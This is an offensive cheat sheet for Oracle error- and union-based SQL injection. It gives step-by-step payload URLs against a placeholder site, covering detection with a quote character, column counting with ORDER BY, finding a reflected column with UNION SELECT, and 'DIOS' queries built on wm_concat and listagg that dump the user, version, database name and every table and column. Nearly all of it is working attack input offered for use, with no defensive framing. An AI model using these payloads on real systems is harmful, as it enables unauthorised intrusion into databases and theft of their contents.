# Oracle Error/Union based SQL Injection Cheatsheet

## Detecting the vulnerability

The most common way to detect a SQLi vulnerability, is by inserting a **'** in the end of GET/POST parameter value:  
`http://domain.com/index.php?id=1'`  

If vulnerable, the website might show an SQL syntax error. This is a good sign that you are dealing with **Error-based SQL injection**:
![error_based_sql_vulnerability](https://i.imgur.com/lnUslML.jpg)

Sometimes no error pops up, but if your naked-eye is somehow trained and experienced, you might see visual differences on the website response. Content-Length of the response might change (website might not fully load up). This is a good sign of **Union-based or Blind-based SQL Injection**.

## Find the number of columns using 'ORDER BY' query
Now that we performed an SQL syntax error to the website, we can begin fuzzing and finding how many columns do we have by using ORDER BY.

`http://domain.com/index.php?id=1' order by 1-- -` 

This query musn't show up error, the website MUST load successfully, since there is no lower number than 1. If the error still persists, try removing the **'** since it breaks the SQL query:
`http://domain.com/index.php?id=1 order by 1-- -`

Now it is time to find the correct number of columns. Now let's use the payload that worked, and try increasing the number by 1, untill an error shows up:

`http://domain.com/index.php?id=1 order by 1-- -` no error  
`http://domain.com/index.php?id=1 order by 2-- -` no error  
`http://domain.com/index.php?id=1 order by 3-- -` no error  
`http://domain.com/index.php?id=1 order by 4-- -` no error  
`http://domain.com/index.php?id=1 order by 5-- -` no error  
`http://domain.com/index.php?id=1 order by 6-- -` no error  
`http://domain.com/index.php?id=1 order by 7-- -` no error  
`http://domain.com/index.php?id=1 order by 8-- -` error  

This means there are only 7 columns. Now we have to find which one of these 7 columns have information.

## Find the vulnerable column where information are stored using 'UNION SELECT' query

Using a simple query, we determine which of the 7 columns reflect our input using. In **UNION SELECT** queries, you have to put **null** as many times as we found the number on **ORDER BY** (this case: 7).

`http://domain.com/index.php?id=1' Union Select null, null, null, null, null, null, null from dual-- -`

If the website loads up successfully (no error must be displayed), it means that we are using the right syntax (without breaking the vulnerable query used by the website). 

Great, let's find which column is reflecting data. To do that, we have to replace each **null** by integer surrounded by **'**. We have to replace each **null** one by one untill a number is being reflected on the website. For example: 

`http://domain.com/index.php?id=1' Union Select '1', null, null, null, null, null, null from dual-- -` not reflecting  
`http://domain.com/index.php?id=1' Union Select '1', '2', null, null, null, null, null from dual-- -` not reflecting  
`http://domain.com/index.php?id=1' Union Select '1', '2', '3', null, null, null, null from dual-- -` not reflecting  
`http://domain.com/index.php?id=1' Union Select '1', '2', '3', '4', null, null, null from dual-- -` not reflecting  
`http://domain.com/index.php?id=1' Union Select '1', '2', '3', '4', '5', null, null from dual-- -` number 5 is being displayed on the website.  

We found that the 5th column is reflecting our input. This will be where our DIOS payload or dumping query will be inserted into.

## Dumping data

Some really basic queries to use for dumping the user and the Oracle version:  
```sql
user
(select banner from v$version where rownum=1)
```

`http://domain.com/index.php?id=1' Union Select '1', '2', '3', '4', (select banner from v$version where rownum=1), null, null from dual-- -`

Use **||** if you want to include more than 1 query while dumping:  
`http://domain.com/index.php?id=1' Union Select '1', '2', '3', '4', user || '<u>You can also insert HTML code</u>'||(select banner from v$version where rownum=1), null, null from dual-- -`

Retrieving the database name:   
```sql
(select sys.database_name from dual)
(SELECT instance_name FROM V$INSTANCE)
SYS.DATABASE_NAME
```

Dumping the whole database with DIOS

For Oracle 11g or older you can use **wm_concat** function:  
```sql
(select wm_concat('<li>'||table_name||':'||column_name)from(select rownum as rnum, table_name, column_name from all_tab_columns order by table_name desc) shell where rnum<120)
```

For Oracle version newer than 11g, **listagg** function is used instead:  
```sql
(select listagg('<li>'||table_name||':'||column_name)from(select rownum as rnum,table_name,column_name from all_tab_columns order by table_name desc) shell where rnum<120)
```
```sql
(select LISTAGG(table_name,'<li>') within group (ORDER BY table_name) from all_tables)
```

The following query shows the inserted DIOS into the 5th (and vulnerable) column as a reference:  
`http://domain.com/index.php?id=1' Union Select '1', '2', '3', '4', (select listagg('<li>'||table_name||':'||column_name)from(select rownum as rnum,table_name,column_name from all_tab_columns order by table_name desc) shell where rnum<120), null, null from dual-- -`

If everything goes as it should be, all the tables and columns should be displayed on the website.
